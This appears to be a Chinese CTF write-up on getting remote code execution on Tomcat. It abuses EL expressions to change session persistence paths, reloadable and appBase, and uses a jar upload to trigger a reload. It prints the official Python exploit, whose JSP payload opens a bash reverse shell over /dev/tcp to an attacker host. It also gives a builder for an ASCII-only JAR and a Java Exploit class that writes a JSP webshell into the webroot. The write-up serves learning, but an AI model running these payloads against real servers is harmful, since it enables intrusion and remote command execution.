+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420205142288.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420205142288.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420205142288"></p>
+<p>分别解释一下该场景的loader、manager、resources、instanceManager分别指什么：</p>
+<ol>
+<li>Loader：管理当前 Web 应用的类加载器，负责加载 <code>.class</code> 文件。一般是WebappLoader</li>
+<li>Manager：管理session创建、销毁、持久化等。比如上面提到的StandardManager和PersistentManager和自定义manager等</li>
+<li>resource：管理Web应用中的资源，比如<code>/WEB-INF/classes</code>、静态文件、JAR包等。一般是用StandardRoot。</li>
+<li>InstanceManager：管理 Web 应用中对象的创建与销毁，比如 Servlet、Filter、Listener。一般实现是用DefaultInstantManager</li>
+</ol>
+<p>直觉上看来，manager.backgroundProcess大概率是我们要找的重启点，但是跟进后发现。这只是一个遍历所有会话，检查每个会话是否已过期的方法。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420210449158.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420210449158.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420210449158"></p>
+<p>这个时候突然想起对Lifecycle的重启发生在StandardContext.reload，将目光看到loader.backgroundProcess（也就是WebappLoader.backgroundProcess），调用了context.reload</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420210742684.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420210742684.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420210742684"></p>
+<p>不过需要满足开启了reloadable和满足modified()方法</p>
+<p>reloadable默认为false</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420211208507.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420211208507.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420211208507"></p>
+<p>modified()取的classLoader.modified()返回值，继续跟进到WebappClassLoaderBase.modified()</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420211604418.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420211604418.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420211604418"></p>
+<p>WebappClassLoaderBase.modified()在不同的Tomcat版本具体实现不同，但是逻辑都一样。我这里是Tomcat 8.5.56版本。</p>
+<p>第一部分检查web 应用中的资源文件（ .class 文件）是否有变动，根据文件的最近修改时间来比较，如果有不同则返回 true。第二部分检查 web 应用中&#x2F;WEB-INF&#x2F;lib的 jar 文件是否有变动，增加、删除和修改都会返回 true。</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420212824052.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250420212824052.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20250420212824052"></p>
+<p>总结一下：</p>
+<p>当modified()检测到系统资源文件或jar文件发生变动时，如果开启了reloadable选项，将触发reload。完成一次对SESSION.ser的序列化和反序列化。</p>
+<h3 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h3><p>首先，修正一个写这篇文以来我的错觉。我一直以为客户端发什么session，服务器接收到的就是什么session。服务器的session肯定只会保存自己的认证的session，而不是发什么来都会保存。</p>
+<p>通过EL表达式能向session中写入数据，这样才能让序列化后的数据有恶意jsp代码</p>
+<p>于是，针对这个受限的文件上传，官方WP解法如下：</p>
+<ul>
+<li>通过 EL 表达式修改 Session 文件存储路径，改成后缀为 jsp；</li>
+<li>通过 EL 表达式向 Session 中写入数据，来让序列化后的数据中有恶意 JSP 的代码；</li>
+<li>通过 EL 表达式将 Context 中的 reloadable 修改为 true；</li>
+<li>使用任意文件上传，上传一个后缀为 jar 的文件至 <code>/WEB-INF/lib/  </code>下，触发 reload，将恶意数据写入；</li>
+<li>通过 web 应用访问恶意 JSP。</li>
+</ul>
+<p>思路已经打通，接下来遇到的最后一个问题就是，如果上传的 .jar 文件是不合法的 .jar，那么原来的应用在 reload 时就会加载失败，导致访问不到这个应用，前功尽弃。</p>
+<p>但是作者压根就没想去成功加载jar包，作者的解决方案是在 reload 之前，通过修改 appBase为根目录</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;pageContext.servletContext.classLoader.resources.context.parent.appBase=<span class="string">&quot;/&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>pageContext.servletContext.classLoader.resources.context代表StandardContext，其parent为StandardHost。而appBase 属性表示所有存放 webapp 的目录，它的值默认是 webapps</p>
+<p>假如我们通过 EL 表达式把它的值修改为系统根目录 &#x2F; ，这时候会发生一个很神奇的事情，就是整个系统盘全部被映射到 Tomcat 上了，整个系统文件资源你都可以直接通过 Tomcat 去访问</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/640.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/640.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="640"></p>
+<p>这样的话，就算原来的应用因为 Context reload 失败而导致 404 失效，还有其他的目录都可供访问。而原来的应用打成404了，Tomcat不会崩溃，依旧能允许解析jsp。那么我们写jsp的时候就写到&#x2F;tmp下，appBase改为&#x2F;或&#x2F;tmp，web业务挂掉也能访问恶意jsp。</p>
+<blockquote>
+<p>分清楚顺序，检查jar文件有变动就会触发reload写session文件，而reload先stop写文件，然后start再加载jar。而且Tomcat 在加载 JAR 包时，如果遇到 某个 JAR 加载失败（比如格式损坏、类冲突、验证异常）<strong>，</strong>一般不会崩溃，而是继续加载其它 JAR 包，并输出错误日志。所以JAR错误并不会影响到写文件。</p>
+</blockquote>
+<p>payload是先写一个受限的jsp修改配置满足reload需求，然后利用受限jsp向session写一个不受限的jsp内容(使用了<code>&lt;</code>这种敏感字符)，然后向&#x2F;WEB-INF&#x2F;lib上传jar触发reload触发session序列化写文件，最后访问不受限的jsp反弹shell</p>
+<p>官方paylaod：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">PROXIES = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    target_url = sys.argv[<span class="number">1</span>]  <span class="comment"># e.g. http://47.243.235.228:39465/</span></span><br><span class="line">    reverse_shell_host = sys.argv[<span class="number">2</span>]</span><br><span class="line">    reverse_shell_port = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">    el_payload = <span class="string">r&quot;&quot;&quot;$&#123;pageContext.servletContext.classLoader.resources.context.manager.pathname=param.a&#125;</span></span><br><span class="line"><span class="string">    $&#123;sessionScope[param.b]=param.c&#125;</span></span><br><span class="line"><span class="string">    $&#123;pageContext.servletContext.classLoader.resources.context.reloadable=true&#125;</span></span><br><span class="line"><span class="string">    $&#123;pageContext.servletContext.classLoader.resources.context.parent.appBase=param.d&#125;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    reverse_shell_jsp_payload = <span class="string">r&quot;&quot;&quot;&lt;%Runtime.getRuntime().exec(new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;sh -i &gt;&amp; /dev/tcp/&quot;&quot;&quot;</span> + reverse_shell_host + <span class="string">&quot;/&quot;</span> + reverse_shell_port + <span class="string">r&quot;&quot;&quot; 0&gt;&amp;1&quot;&#125;);%&gt;&quot;&quot;&quot;</span></span><br><span class="line">    r = requests.post(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export&#x27;</span>, data=&#123;<span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;a.jsp&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: el_payload, &#125;,</span><br><span class="line">                      proxies=PROXIES)<span class="comment">#目标export为上传路由</span></span><br><span class="line"></span><br><span class="line">    shell_path = r.text.strip().split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    shell_url = <span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export/<span class="subst">&#123;shell_path&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    r2 = requests.post(url=shell_url,</span><br><span class="line">                       data=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;/tmp/session.jsp&#x27;</span>, <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;voidfyoo&#x27;</span>, <span class="string">&#x27;c&#x27;</span>: reverse_shell_jsp_payload, <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, &#125;,</span><br><span class="line">                       proxies=PROXIES)<span class="comment">#对应param.a,b,c,d</span></span><br><span class="line"></span><br><span class="line">    r3 = requests.post(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/export&#x27;</span>,</span><br><span class="line">                       data=&#123;<span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;./WEB-INF/lib/&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;a.jar&#x27;</span>, <span class="string">&#x27;content&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, &#125;,</span><br><span class="line">                       proxies=PROXIES)</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">10</span>)  <span class="comment"># wait a while</span></span><br><span class="line"></span><br><span class="line">    r4 = requests.get(url=<span class="string">f&#x27;<span class="subst">&#123;target_url&#125;</span>/tmp/session.jsp&#x27;</span>, proxies=PROXIES)</span><br></pre></td></tr></table></figure>
+
+<p>官方WP，这里就不再复现。</p>
+<p>因为需要一个执行修改变量的点去修改reloadable，这就是为什么不需要关注Tomcat启动时的反序列化session文件的原因。在这个场景下有jsp EL表达式修改，那么都能完成文件上传jsp了，那一步到位RCE了，为什么要多此一举去写反序列化文件触发反序列化漏洞呢</p>
+<h2 id="解法2：ASCII-JAR文件上传"><a href="#解法2：ASCII-JAR文件上传" class="headerlink" title="解法2：ASCII-JAR文件上传"></a>解法2：ASCII-JAR文件上传</h2><p>官方WP之所以选择以受限jsp作为入口，主要是因为：</p>
+<ul>
+<li>写入数据前后有脏数据</li>
+<li>程序以UTF-8字符串获取参数并写入，而不是流、字节。</li>
+</ul>
+<p>首先来看下，什么是 Jar？根据官方文档 <a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/6/docs/technotes/guides/jar/jar.html">JAR File Specification</a>，一个 Jar 文件就是带有可选的 META-INF 目录的 zip 文件。</p>
+<p>以前只知道jar文件能解压，结果jar实际上就是zip格式</p>
+<p>因为题目写的文件内容是一个<code>String</code>而不是一个<code>byte[]</code>，<code>String</code>的编码决定着它的<code>byte[]</code>。各类编码是可以兼容ASCII的，无论怎么编码转换，ASCII范围的字符二进制都可以做到不变。</p>
+<p>所以该题最终需要控制jar的内容ASCII在0-127同时不包含被转义的<code>&amp;&lt;&#39;&gt;&quot;()</code>字符。</p>
+<h3 id="JAR包结构"><a href="#JAR包结构" class="headerlink" title="JAR包结构"></a>JAR包结构</h3><p>一个简单的jar包格式如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wrap_jar</span>(<span class="params">raw_data,compressed_data,zip_entry_filename</span>):</span><br><span class="line">    crc = zlib.crc32(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">        <span class="string">b&#x27;PK\3\4&#x27;</span> +    <span class="comment"># Magic</span></span><br><span class="line">        binascii.unhexlify(</span><br><span class="line">            <span class="string">&#x27;0a000000&#x27;</span> +     <span class="comment"># Version needed to extract</span></span><br><span class="line">            <span class="string">&#x27;080000000000&#x27;</span>   <span class="comment"># Compression Method</span></span><br><span class="line">        ) +</span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, crc) +</span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)) +</span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)) +</span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="built_in">len</span>(zip_entry_filename)) +</span><br><span class="line">        <span class="string">b&#x27;\0\0&#x27;</span> +</span><br><span class="line">        zip_entry_filename +</span><br><span class="line">        compressed_data +</span><br><span class="line">        <span class="string">b&#x27;PK\1\2\0\0&#x27;</span> +  <span class="comment"># Magic</span></span><br><span class="line">        binascii.unhexlify(</span><br><span class="line">            <span class="string">&#x27;0a000000&#x27;</span> +     <span class="comment"># Version needed to extract</span></span><br><span class="line">            <span class="string">&#x27;080000000000&#x27;</span></span><br><span class="line">        ) +</span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, crc) +</span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)) +</span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)) +</span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(zip_entry_filename)) +</span><br><span class="line">        <span class="string">b&#x27;\0&#x27;</span> * <span class="number">10</span> +</span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>) + <span class="comment"># offset of file in archive</span></span><br><span class="line">        zip_entry_filename +</span><br><span class="line">        <span class="string">b&#x27;PK\5\6\0\0\0\0\0\0&#x27;</span> + <span class="comment"># Magic</span></span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">1</span>) +  <span class="comment"># number of files</span></span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(zip_entry_filename) + <span class="number">0x2e</span>) + <span class="comment"># size of CD</span></span><br><span class="line">        struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) + <span class="built_in">len</span>(zip_entry_filename) + <span class="number">0x1e</span>) + <span class="comment"># offset of CD</span></span><br><span class="line">        <span class="string">b&#x27;\0\0&#x27;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure>
+
+<p>本地文件头部分包括如下，其中<code>b&#39;PK\x03\x04&#39;</code>是ZIP文件头标识符<code>0x04034b50</code>（大端存储）；然后是0a00版本号，0000标志位，0800为压缩方式(08是deflate)，00000000是文件日期（全0代表忽略）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;PK\3\4&#x27;</span> +    <span class="comment"># Magic</span></span><br><span class="line">binascii.unhexlify(</span><br><span class="line">    <span class="string">&#x27;0a000000&#x27;</span> +     <span class="comment"># Version needed to extract</span></span><br><span class="line">    <span class="string">&#x27;080000000000&#x27;</span>   <span class="comment"># Compression Method</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>下面是数据部分，crc为CRC32校验码，compressed_data为实际压缩后的内容，raw_data是原始未压缩数据，<code>%pow(2,32)</code>是为了限制在32位内。zip_entry_filename是ZIP entry的文件名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, crc) +</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)) +</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)) +</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="built_in">len</span>(zip_entry_filename)) +</span><br><span class="line"><span class="string">b&#x27;\0\0&#x27;</span> +</span><br><span class="line">zip_entry_filename +</span><br><span class="line">compressed_data</span><br></pre></td></tr></table></figure>
+
+<p>然后是中央目录项，你会发现和本地文件头几乎一样，但是少了原始数据部分。这是为了只要读取目录就能知道里面有哪些文件，不用遍历所有数据段。起到一个索引目录的作用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;PK\1\2\0\0&#x27;</span> +  <span class="comment"># Magic</span></span><br><span class="line">binascii.unhexlify(</span><br><span class="line">    <span class="string">&#x27;0a000000&#x27;</span> +     <span class="comment"># Version needed to extract</span></span><br><span class="line">    <span class="string">&#x27;080000000000&#x27;</span></span><br><span class="line">) +</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, crc) +</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)) +</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>)) +</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(zip_entry_filename)) +</span><br><span class="line"><span class="string">b&#x27;\0&#x27;</span> * <span class="number">10</span> +</span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="number">0</span>) + <span class="comment"># offset of file in archive</span></span><br><span class="line">zip_entry_filename</span><br></pre></td></tr></table></figure>
+
+<p>最后是End of Central Directory (EOCD)部分，主要是为了表示中央目录的大小和偏移，为中央目录服务的一个块。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;PK\x05\x06\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="number">1</span>)  <span class="comment"># 文件总数（只包含 1 个 entry）</span></span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(zip_entry_filename) + <span class="number">0x2e</span>)  <span class="comment"># 中央目录大小（46 字节 + 文件名）</span></span><br><span class="line">struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) + <span class="built_in">len</span>(zip_entry_filename) + <span class="number">0x1e</span>)  <span class="comment"># CD 偏移</span></span><br><span class="line"><span class="string">b&#x27;\0\0&#x27;</span>  <span class="comment"># 注释长度（0）</span></span><br></pre></td></tr></table></figure>
+
+<p>其实zip只要第一部分就能完成解压。而JAR一般是必须依赖中央目录和EOCD块的</p>
+<p>ZIP 是一个很容错、很“宽松”的格式。根据 ZIP 规范：</p>
+<ul>
+<li>Local File Header + Compressed Data 已经足够让某些解压工具解出文件。</li>
+<li>中央目录（CD）和 EOCD 是为了支持：<ul>
+<li>快速索引</li>
+<li>文件名和偏移统一管理</li>
+<li>ZIP 正确完整性校验</li>
+</ul>
+</li>
+</ul>
+<p>虽然 JAR 是 ZIP 的超集，但它有额外的规范约束，特别是被 JVM 加载时：</p>
+<p>Java 的类加载器（<code>URLClassLoader</code>、<code>JarFile</code> 等）：</p>
+<ul>
+<li>会先读取 EOCD（End of Central Directory） → 获取 CD 的位置</li>
+<li>再从 中央目录（CD） 中获取 class 的偏移、大小、压缩信息</li>
+<li>然后跳转到 Local Header → 解压 <code>.class</code> 字节码</li>
+</ul>
+<p>没有 Central Directory，就不能作为“类库” JAR 被 JVM 加载。</p>
+<h3 id="JAR包构造"><a href="#JAR包构造" class="headerlink" title="JAR包构造"></a>JAR包构造</h3><p>要让所有部分都在限定的ASCII范围，其实是需要以下7个部分满足要求</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> compressed_data</span><br><span class="line"><span class="number">2.</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, crc)</span><br><span class="line"><span class="number">3.</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(raw_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line"><span class="number">4.</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) % <span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line"><span class="number">5.</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(zip_entry_filename))</span><br><span class="line"><span class="number">6.</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(zip_entry_filename) + <span class="number">0x2e</span>)</span><br><span class="line"><span class="number">7.</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, <span class="built_in">len</span>(compressed_data) + <span class="built_in">len</span>(filename) + <span class="number">0x1e</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>zip_entry_filename</code>为<code>Exploit.class</code>的话，5和6是满足要求的，没有受限字符</p>
+<p>1条件中的<code>compressed_data</code>是deflate算法压缩后的数据，利用如下ascii-zip项目，可输出经过 deflate 压缩器，得到 [A-Za-z0-9] ASCII 字节范围内的压缩数据</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/molnarg/ascii-zip">https://github.com/molnarg/ascii-zip</a></p>
+<p>关于deflate算法，涉及到LZ77滑动窗和Huffman编码（按频率编码字符为二进制串，学过数据结构会很熟），在此略过。</p>
+<p>还剩下2，3，4，7部分，如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, crc)</span><br><span class="line"><span class="number">2.</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, len(raw_data) % pow(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line"><span class="number">3.</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, len(compressed_data) % pow(<span class="number">2</span>, <span class="number">32</span>))</span><br><span class="line"><span class="number">4.</span> struct.pack(<span class="string">&#x27;&lt;L&#x27;</span>, len(compressed_data) + len(zip_entry_filename) + <span class="number">0x1e</span>)</span><br></pre></td></tr></table></figure>
+
+<p>一个文件的crc，raw_data(原始数据)，compress_data之间互有影响。可以尝试寻找一个数学关系来表示，从而计算出符合条件的jar包。但是很麻烦</p>
+<p>c0ny1师傅选择往class文件不断填充垃圾数据进行爆破，直到这四个部分都符合要求</p>
+<p>假设构造的jar包是往<code>/opt/tomcat/webapps/ROOT/</code>下写一个shell.jsp，代码如下，其中paddingData部分可以任意填充垃圾数据</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.jasper.compiler.StringInterpreter;</span><br><span class="line"><span class="keyword">import</span> org.apache.jasper.compiler.StringInterpreterFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> <span class="keyword">implements</span> <span class="title class_">StringInterpreter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">paddingData</span> <span class="operator">=</span> <span class="string">&quot;&#123;PADDING_DATA&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 要执行的代码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">shell</span> <span class="operator">=</span> <span class="string">&quot;&lt;%out.println(\\&quot;</span>Exploit by c0ny1<span class="meta">@sglab</span>\\<span class="string">&quot;);%&gt;&quot;</span>;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;/opt/tomcat/webapps/ROOT/shell.jsp&quot;</span>);</span><br><span class="line">        fos.write(shell.getBytes());</span><br><span class="line">        fos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 防止后续tomcat编译jsp报错</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">convertString</span><span class="params">(Class&lt;?&gt; c, String s, String attrName, Class&lt;?&gt; propEditorClass, <span class="type">boolean</span> isNamedAttribute)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringInterpreterFactory</span>.DefaultStringInterpreter().convertString(c,s,attrName,propEditorClass,isNamedAttribute);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用上面作为模版代码，编写python脚本不断向paddingData字段填充垃圾数据，然后javac编译，最后计算class文件压缩之后是否符合条件。</p>
